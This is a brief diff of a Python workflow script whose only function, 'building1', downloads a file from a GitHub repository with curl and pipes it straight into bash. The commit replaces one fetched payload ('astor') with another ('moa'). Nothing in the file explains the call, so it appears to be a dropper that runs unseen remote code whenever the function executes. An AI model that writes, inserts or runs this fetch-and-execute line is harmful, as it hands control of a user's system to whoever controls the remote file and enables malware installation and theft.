@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/astor | bash')
+  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/moa | bash')
 
 if __name__ == "__main__":
   app.start()
